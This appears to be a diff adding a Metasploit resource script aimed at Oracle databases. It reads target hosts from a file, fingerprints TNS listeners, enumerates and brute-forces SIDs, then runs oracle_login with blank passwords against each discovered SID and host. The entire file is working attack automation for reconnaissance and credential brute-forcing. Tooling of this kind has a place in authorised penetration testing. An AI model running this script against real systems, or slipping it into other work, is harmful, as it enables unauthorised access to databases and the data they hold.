@@ -1,0 +1,41 @@
+use auxiliary/scanner/oracle/tnslsnr_version
+set threads 16
+set verbose true
+
+<ruby>
+file='/client/hosts.txt'
+File.readlines(file).each do |line|
+  self.run_single("set RHOSTS #{line}")
+  self.run_single("run")
+end
+</ruby>
+
+use auxiliary/scanner/oracle/sid_enum
+set threads 8
+set verbose true
+services -s oracle -u -R
+run
+
+use auxiliary/scanner/oracle/sid_brute
+set bruteforce_speed 4
+set threads 8
+set verbose true
+services -s oracle -u -R
+run
+
+use auxiliary/scanner/oracle/oracle_login
+set bruteforce_speed 4
+set blank_passwords true
+set threads 8
+
+<ruby>
+framework.db.notes.each do |note|
+  if note.ntype == "oracle.sid"
+    sid = note.data
+    host = note.host.address
+    self.run_single("set SID #{sid}")
+    self.run_single("set RHOSTS #{host}")
+    self.run_single("run")
+  end
+end
+</ruby>
